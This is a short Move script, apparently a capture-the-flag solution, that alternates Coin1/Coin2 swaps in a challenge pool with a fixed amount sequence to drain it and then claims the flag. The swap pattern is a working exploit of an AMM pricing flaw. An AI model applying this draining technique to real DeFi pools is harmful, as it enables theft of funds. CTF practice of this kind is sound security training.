script {
    use ctfmovement::pool::{Self, Coin1, Coin2};
    use aptos_framework::coin;
    use aptos_framework::vector;

    fun catch_the_flag(dev: &signer) {
        let dev_addr = std::signer::address_of(dev);
        pool::get_coin(dev);
        let amount_list = vector[5, 10, 12, 15, 20, 24];
        let if_swap_12 = true;
        let counter = 0;
        while (counter < 6) {
            let amount = *vector::borrow(&amount_list, counter);
            if (if_swap_12) {
                let coin_in = coin::withdraw<Coin1>(dev, amount);
                let coin_out = pool::swap_12(&mut coin_in, amount);
                coin::destroy_zero(coin_in);
                coin::deposit(dev_addr, coin_out);
            } else {
                let coin_in = coin::withdraw<Coin2>(dev, amount);
                let coin_out = pool::swap_21(&mut coin_in, amount);
                coin::destroy_zero(coin_in);
                coin::deposit(dev_addr, coin_out);
            };
            counter = counter + 1;
            if_swap_12 = !if_swap_12;
        };
        pool::get_flag(dev);
    }
}